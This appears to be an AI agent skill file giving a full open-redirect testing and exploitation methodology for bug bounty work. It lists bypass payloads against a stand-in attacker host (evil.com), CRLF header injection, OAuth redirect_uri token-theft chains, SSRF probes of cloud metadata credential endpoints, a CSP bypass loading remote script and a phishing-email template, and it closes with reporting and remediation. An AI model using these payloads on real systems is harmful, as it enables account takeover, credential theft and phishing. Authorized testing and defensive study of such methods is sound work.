---
name: redirect-forge
description: Complete open redirect detection and exploitation methodology — parameter discovery, 30+ bypass techniques, OAuth token theft, SSRF chaining, CSP abuse, phishing escalation, and report structure. Use when testing a redirect parameter (?next=, ?url=, ?redirect=), a controllable Location header, OAuth redirect_uri abuse, or chaining open redirect into SSRF, CSP bypass, or account takeover.
license: MIT
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["open-redirect", "oauth", "ssrf", "phishing", "bypass", "web", "pentest", "bug-bounty"]
---

# Redirect Forge — Open Redirect

Open redirect occurs when an application redirects a user to a URL that is partially or fully controlled by attacker input, without proper validation. On its own it enables phishing. Chained with OAuth, SSRF, or CSP it becomes Critical.

---

## Phase 1 — Discover Redirect Parameters

Cast a wide net. Any parameter that accepts a URL or path is a candidate.

### 1.1 Common Parameter Names

```
redirect        redirect_url      redirect_uri      redirect_to
return          returnUrl         return_url        returnTo
next            next_url          goto              go
url             dest              destination       target
forward         fwd               location          link
out             exit              r                 redir
ref             referrer          continue          callback
back            from              login_redirect    post_login_url
```

### 1.2 Discovery via Passive Recon

```bash
# Collect all URLs from Wayback Machine and other crawlers
gau target.com | grep -iE "(redirect|return|next|goto|url|dest|redir|forward|target|callback|location)=" | sort -u | tee redirect-params.txt

# Same with waybackurls
waybackurls target.com | grep -iE "(redirect|return|next|goto|url=|dest=|redir=)" | sort -u

# Use gf pattern for open redirect
gf redirect redirect-params.txt

# Extract from JS files — sometimes redirect targets are constructed in JS
curl -s https://target.com/app.js | grep -iE "(window\.location|location\.href|location\.replace|location\.assign)" 
```

### 1.3 Discovery via Active Crawling

```bash
# Spider and find redirect params with katana
katana -u https://target.com -d 3 -silent | grep -iE "(redirect|return|next|goto|url=)" | sort -u

# Burp Suite: use Param Miner extension to discover hidden redirect parameters
# Burp → Proxy → HTTP history → right-click → Extensions → Param Miner → Guess params
```

### 1.4 HTTP Headers that Trigger Redirects

```
Referer:        https://evil.com           (some apps redirect back to Referer)
X-Original-URL: /login?next=https://evil.com
X-Forwarded-Host: evil.com                 (affects Location header on some apps)
Host:           evil.com                   (Host header injection → redirect)
```

### 1.5 OAuth / SSO Redirect Parameters

```
redirect_uri    callback_url    callback_uri
post_logout_redirect_uri        end_session_endpoint
```

### 1.6 Confirm Reflection

Send a canary first — verify the parameter actually controls the redirect destination:

```bash
curl -v "https://target.com/login?next=https://CANARY.burpcollaborator.net" 2>&1 | grep -i location
# Expected: Location: https://CANARY.burpcollaborator.net
```

If the `Location` header reflects your input → redirect parameter is controllable.

---

## Phase 2 — Verify Basic Open Redirect

Start with the simplest possible payload before reaching for bypasses.

```
https://target.com/login?next=https://evil.com
https://target.com/logout?redirect=https://evil.com
https://target.com/redirect?url=https://evil.com
https://target.com/go?to=https://evil.com
```

**Confirm:** the browser (or `curl -L`) ends up at `https://evil.com`.

**Signs of partial protection to bypass:**
- Only your input domain is accepted → go to Phase 3 (allowlist bypass)
- Input is URL-decoded before comparison → try double-encoding
- Input is regex-matched → try alternate protocol or domain confusion

---

## Phase 3 — Bypass Techniques

Work through these systematically. Try each category before concluding the control is solid.

### 3.1 Protocol Substitution

```
//evil.com                        protocol-relative — inherits current scheme
///evil.com                       triple-slash — parsed differently by some browsers
////evil.com
https:evil.com                    colon without slashes
https:/evil.com                   single slash
javascript:alert(document.domain) XSS via redirect (if rendered in href/link)
data:text/html,<script>alert(1)</script>
```

### 3.2 Allowlist — Suffix Bypass (target.com is whitelisted)

```
https://evil.com?target.com         query string confusion
https://evil.com#target.com         fragment confusion
https://evil.com/.target.com        path segment mimicking subdomain
https://evil.com%2F@target.com      URL-encoded slash after domain
https://target.com.evil.com         subdomain lookalike
https://target.com@evil.com         credentials field (username = target.com)
https://evil.com\target.com         backslash parsed as separator on Windows apps
https://evilXtarget.com             substring match bypass
```

### 3.3 Allowlist — Prefix Bypass (https://target.com is whitelisted prefix)

```
https://target.com.evil.com         subdomain of attacker
https://target.com@evil.com         @-based bypass — host is evil.com
https://target.com%40evil.com       URL-encoded @
https://target.com%2F%2Fevil.com    encoded double-slash → https://target.com//evil.com
```

### 3.4 @ Operator (Credentials Confusion)

```
https://target.com@evil.com         everything before @ is user info; host = evil.com
https://target.com:password@evil.com
@evil.com                           bare @ with no user info
```

### 3.5 URL Encoding Bypasses

```
%68%74%74%70%73%3A%2F%2Fevil.com    full URL-encoded
https%3A%2F%2Fevil.com              encoded colon and slashes
%2F%2Fevil.com                      encoded //
%09//evil.com                       tab character before //
%0a//evil.com                       newline before //
%0d//evil.com                       carriage return before //
%00//evil.com                       null byte
%E2%80%8B//evil.com                 zero-width space (U+200B)
```

### 3.6 Double URL Encoding

```
%2568%2574%2574%2570%2573%253a%252f%252fevil.com    double-encoded https://
%252F%252Fevil.com                                   double-encoded //evil.com
```

### 3.7 Unicode / Internationalized Bypasses

```
https://ⓔvil.com                   Unicode letter lookalikes
https://evil。com                   Unicode full-stop (。= U+3002) — IDNA normalization
https://xn--evil-rta.com            Punycode — renders as evíl.com
https://EVIL.COM                    uppercase — some comparisons are case-sensitive
ℎttps://evil.com                    Unicode ℎ (U+210E, looks like h)
```

### 3.8 Path Traversal — Relative Redirects

When the app only accepts relative paths (`/dashboard`):

```
//evil.com                          treated as relative by some parsers
////evil.com
/\evil.com                          backslash — browser may normalize to /
/.//evil.com
/%09/evil.com
/..//evil.com
```

### 3.9 IPv6 / IP Confusion

```
https://[::1]                       IPv6 loopback
https://[::ffff:127.0.0.1]          IPv4-mapped IPv6
https://2130706433                  decimal notation for 127.0.0.1
https://0x7f000001                  hex notation for 127.0.0.1
https://017700000001                octal notation for 127.0.0.1
```

### 3.10 Parameter Pollution

```
?next=https://target.com&next=https://evil.com       last wins
?next=https://evil.com&next=https://target.com       first wins
?url=https://target.com%26url=https://evil.com        encoded & pollution
```

### 3.11 Fragment / Anchor Tricks

```
https://target.com/redirect?next=https://evil.com%23.target.com
# Server sees: next=https://evil.com#.target.com → regex matches ".target.com" at end
# Browser navigates to: https://evil.com (fragment ignored)
```

### 3.12 Case Sensitivity

```
HTTPS://evil.com
Https://Evil.Com
hTtPs://EVIL.COM
```

### 3.13 CRLF Injection in Redirect (Header Injection)

When user input is placed in a `Location:` header without sanitization:

```
https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=hijacked
https://target.com/redirect?url=https://evil.com%0d%0aX-Injected-Header:%20value
```

**Impact:** inject arbitrary HTTP response headers → cookie fixation, cache poisoning.

---

## Phase 4 — OAuth redirect_uri Exploitation

OAuth open redirect is the highest-impact variant — it steals authorization codes and access tokens.

### 4.1 Understand the OAuth Flow

```
1. App sends user to:
   GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback&response_type=code

2. User logs in at IdP (Google, GitHub, Okta, etc.)

3. IdP redirects user to redirect_uri with code:
   GET https://target.com/callback?code=AUTH_CODE_HERE

4. App exchanges code for access token → user is logged in
```

**Goal:** replace `redirect_uri` with your server → you receive the auth code → exchange it for a token → account takeover.

### 4.2 redirect_uri Bypass Techniques

```bash
# Exact match bypass — use open redirect on the same domain
redirect_uri=https://target.com/redirect?next=https://evil.com

# Subdomain — if IdP accepts *.target.com
redirect_uri=https://attacker.target.com/callback

# Path traversal — if IdP only validates prefix
redirect_uri=https://target.com/callback/../../../evil

# Extra parameters
redirect_uri=https://target.com/callback?injected=https://evil.com

# Fragment
redirect_uri=https://target.com/callback%23.evil.com

# Domain confusion
redirect_uri=https://target.com.evil.com/callback
redirect_uri=https://target.com@evil.com/callback

# URL encoding
redirect_uri=https%3A%2F%2Fevil.com%2Fcallback

# Wildcard abuse — if app registers *.target.com
redirect_uri=https://evil.target.com/callback  ← if you control a subdomain
```

### 4.3 Chain: Open Redirect on Same Domain → Token Theft

If the IdP whitelists `https://target.com/*` and `target.com` has an open redirect at `/go?to=`:

```
redirect_uri=https://target.com/go?to=https://evil.com
```

The auth code/token lands at `evil.com` via the `Referer` header or URL fragment.

### 4.4 Capturing the Token

Set up a listener:

```bash
# Python listener
python3 -m http.server 8080

# Or use ngrok for a public URL
ngrok http 8080
```

Craft the OAuth URL:

```
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://YOUR_SERVER/callback&
  response_type=code&
  scope=email+profile
```

Victim clicks link → IdP sends code to your server → you exchange code for token.

### 4.5 Stealing Tokens via Referer

When `response_type=token` (implicit flow), the token lands in the URL fragment:

```
https://target.com/callback#access_token=TOKEN_HERE&token_type=Bearer
```

If `/callback` has an open redirect or includes external resources (analytics, CDN):

```html
<script src="https://analytics.evil.com/track.js"></script>
```

The browser sends `Referer: https://target.com/callback#access_token=TOKEN_HERE` to analytics server.

---

## Phase 5 — Chaining Open Redirect with Other Bugs

### 5.1 Open Redirect → SSRF

When the server-side fetches the redirect target before sending the 302:

```bash
# Target internally resolves the URL before redirecting
GET /proxy?url=https://evil.com

# Chain to internal metadata endpoints
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /proxy?url=http://internal-admin.target.com/api/admin/users
```

**Detection:** if response time changes for internal IPs vs external — server-side fetch confirmed.

### 5.2 Open Redirect → CSP Bypass

When CSP uses `'nonce'` or `'strict-dynamic'` but the target domain is whitelisted as a redirect:

```
Content-Security-Policy: script-src https://target.com https://cdn.trusted.com
```

If `target.com` has an open redirect to an attacker-controlled page that serves JS:

```html
<script src="https://target.com/redirect?url=https://evil.com/malicious.js"></script>
```

Browser follows the redirect → loads script from `evil.com` → CSP bypassed.

### 5.3 Open Redirect → Phishing Campaign

Full phishing chain leveraging brand trust:

```
Email to victim:
  "Click here to reset your password: https://target.com/reset?next=https://phishing-page.com"

User sees: target.com in the URL → clicks → lands on phishing page
```

Phishing page mimics `target.com` login form → harvests credentials.

### 5.4 Open Redirect → SAML/SSO Token Theft

In SAML flows with `RelayState` or `AuthnRequest`:

```xml
<samlp:AuthnRequest
  AssertionConsumerServiceURL="https://target.com/saml/callback?RelayState=https://evil.com">
```

If `RelayState` is used as a post-login redirect without validation → open redirect post-authentication.

---

## Phase 6 — Blind Open Redirect

When the redirect is server-side only (302 is not visible to you) or affects another user's session:

### 6.1 Out-of-Band Detection

```bash
# Use Burp Collaborator or interactsh
GET /redirect?next=https://YOUR-OOB-DOMAIN.burpcollaborator.net
# Watch for DNS/HTTP callback — server fetched your URL
```

### 6.2 Time-Based (SSRF variant)

```bash
# Internal IP that takes longer to respond vs instant rejection
GET /redirect?next=http://10.0.0.1/
# Measure response time — delay indicates server attempted connection
```

---

## Phase 7 — Impact Escalation Map

| Chain | Severity | Conditions |
|---|---|---|
| Open redirect → phishing | Medium | Standalone — brand trust abuse |
| Open redirect → credential harvest | High | Convincing phishing + victim clicks |
| Open redirect → OAuth token theft | Critical | OAuth implicit flow + redirect on same domain |
| Open redirect → auth code theft | Critical | IdP whitelists domain + app has open redirect |
| Open redirect → SSRF | Critical | Server fetches URL before redirecting |
| Open redirect → CSP bypass + XSS | Critical | Trusted domain whitelisted in CSP |
| Open redirect → CRLF injection | High | Input reflected in Location header unsanitized |
| Open redirect → SAML redirect | High | RelayState not validated after SSO |
| Open redirect → JWT/session leak | Critical | Token in URL + redirect hits external resource via Referer |

---

## Phase 8 — Automated Testing

```bash
# openredirex — purpose-built open redirect fuzzer
openredirex -l redirect-params.txt -p payloads.txt

# ffuf — fuzz redirect parameter values
ffuf -u "https://target.com/login?next=FUZZ" \
     -w references/payloads.txt \
     -mc 301,302,307,308 \
     -fr "target\.com"      # filter: drop responses that redirect back to target

# Use Burp Intruder on the redirect parameter with the payload list from references/payloads.txt

# gf + nuclei (open-redirect templates)
gau target.com | gf redirect | nuclei -t nuclei-templates/http/redirect/

# dalfox — also detects redirect to javascript: (XSS variant)
dalfox url "https://target.com/login?next=https://evil.com" --only-custom-payload
```

---

## Phase 9 — Confirm the Finding

- [ ] Redirect parameter identified and confirmed controllable (canary in Location header)
- [ ] Basic payload (`https://evil.com`) triggers redirect — OR — bypass payload succeeds
- [ ] Reproducible from a fresh browser session (no session dependency)
- [ ] Impact demonstrated: phishing URL works / token received on OOB server / SSRF confirmed
- [ ] Screenshot or video of browser navigating to attacker-controlled page

**False positive checks:**
- App redirects to a fixed list of URLs — not open redirect (enumerable, not injectable)
- App reflects the URL in HTML body only but doesn't redirect — different vuln class (reflected input)
- `Location` header present but `http_only_redirect` middleware blocks external domains downstream

---

## Phase 10 — Report Structure

```
Title: Open Redirect on [endpoint] — [Severity Justification, e.g., OAuth Token Theft]

Severity: Critical / High / Medium
  Critical: OAuth/SAML token theft, SSRF chain, CSP bypass → XSS
  High:     Credential phishing with CRLF injection or session leak via Referer
  Medium:   Standalone open redirect for phishing (no token theft)
  Low:      Redirect to same domain, or requires user already authenticated

CWE: CWE-601 — URL Redirection to Untrusted Site ('Open Redirect')
OWASP: A01:2021 – Broken Access Control

CVSS 3.1 Base (standalone phishing):   AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  → 6.1 (Medium)
CVSS 3.1 Base (OAuth token theft):     AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N  → 8.7 (High/Critical)

Affected endpoint: GET https://target.com/login?next=[REDIRECT_TARGET]
Affected parameter: next

Steps to reproduce:
1. Navigate to: https://target.com/login?next=https://evil.com
2. Complete login (or simply follow the URL if no auth required)
3. Observe: browser is redirected to https://evil.com
   [For bypass payloads]: step 1 uses https://target.com@evil.com — note which bypass worked

For OAuth token theft:
1. Identify that target.com is an authorized redirect_uri for [OAuth provider]
2. Locate open redirect at https://target.com/go?to=
3. Construct: [OAuth auth endpoint]?client_id=[ID]&redirect_uri=https://target.com/go%3Fto%3Dhttps%3A%2F%2Fevil.com&response_type=token&scope=email
4. Victim clicks link → completes OAuth → auth code/token delivered to evil.com

Impact:
- [Phishing] Users are redirected to attacker-controlled page under the guise of [target.com]'s trusted URL
- [Token theft] Attacker receives OAuth access token → full account takeover
- [SSRF] Attacker can probe internal network / cloud metadata endpoint
- [CRLF] Arbitrary headers injected into HTTP response

Evidence:
- HTTP request showing redirect parameter
- HTTP response showing Location: https://evil.com (or attacker's OOB domain)
- Screenshot/video of browser ending at attacker's page
- OOB server log showing DNS/HTTP callback for blind variant

Remediation:
- Maintain a server-side allowlist of permitted redirect destinations — reject anything else
  UNSAFE: return redirect(request.args['next'])
  SAFE:   ALLOWED = {'/dashboard', '/profile'}; next = request.args.get('next', '/'); return redirect(next if next in ALLOWED else '/')
- For relative redirects: accept only paths starting with '/' and reject '//'; validate with urllib.parse
- For OAuth redirect_uri: enforce exact string match — not prefix, not regex, not wildcard
- Remove redirect parameters entirely where not required — use POST-login redirect stored in session
- Validate URL components server-side: scheme must be https, host must be in allowlist
- Set Referrer-Policy: no-referrer on pages that receive tokens in URL fragments
```

---

## Quick-Reference: Priority Attack Order

1. **OAuth `redirect_uri`** — highest impact, test first on any app with SSO/OAuth login
2. **Post-login `?next=` / `?return=`** — most common; test basic payload then @-bypass and fragment bypass
3. **Logout redirect** — often less-validated; may bypass allowlists
4. **Password reset / email link redirects** — token in URL + redirect = instant account takeover
5. **`Referer`-based redirects** — `curl -H "Referer: https://evil.com"` to confirm
6. **Server-side URL fetch + redirect** — check for SSRF chain with internal IP payloads

---

## Reference Files

- `references/payloads.txt` — 100+ redirect bypass payloads (ready for ffuf/Intruder)
- `references/tools.md` — openredirex, gf, nuclei templates, Burp workflow
- `references/oauth-redirect-guide.md` — full OAuth redirect_uri attack methodology
